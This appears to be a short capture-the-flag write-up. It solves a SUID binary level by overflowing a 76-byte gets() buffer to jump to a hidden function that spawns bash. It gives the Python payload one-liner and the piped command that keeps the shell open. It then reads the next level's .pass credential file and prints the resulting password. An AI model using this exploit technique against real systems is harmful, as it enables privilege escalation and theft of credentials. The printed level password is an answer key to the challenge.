This programs uses gets that reads from stdin and puts stuff into  a buffern, buffer size is 76 and binary uses SUID so let's cook a buffer overflow

We can also see that there is a function run that's not called and execs bash, we should probably hit that

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

The string above will fill the buffer, we now need to append the target memory address 

In order to format the adress properly, we can use python and the lib struct, it looks like that : 
```python
import struct
struct.pack('<I', 0x08048444)
    b'D\x84\x04\x08'
```

So the adress formatted properly is D\x84\x04\x08 
and now print it into a file that we'll pipe into the process

`python -c 'print("a"*76  + "D\x84\x04\x08")' > /tmp/exploit`

We can now see a different message, confirming that we hit the target function, but still no shell

Turns out, shell reads what's coming from the cat and it sends EOF after the file content, so add - to prevent it from closing stdin after the file

cat /tmp/exploit - | ./level1

now we have a shell, list the token 

cat /home/user/level2/.pass

53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77